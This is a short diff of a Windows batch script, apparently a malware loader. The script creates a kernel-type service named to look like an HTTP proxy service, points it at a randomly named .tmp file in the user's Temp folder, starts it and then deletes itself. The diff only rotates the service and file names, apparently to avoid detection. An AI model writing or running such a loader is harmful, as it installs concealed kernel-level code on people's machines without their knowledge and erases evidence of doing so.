@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create AutoHttpWinProxySvc6374_c binpath=C:\Users\%username%\AppData\Local\Temp\39de3374-aa2c-4a91-97ae-b356c3d94216.tmp type=kernel
-sc start AutoHttpWinProxySvc6374_c
+sc create AutoHttpWinProxySvc7463_c binpath=C:\Users\%username%\AppData\Local\Temp\61fc8a92-d37b-4c06-8b45-e798d21a57c3.tmp type=kernel
+sc start AutoHttpWinProxySvc7463_c
 del "%~f0"
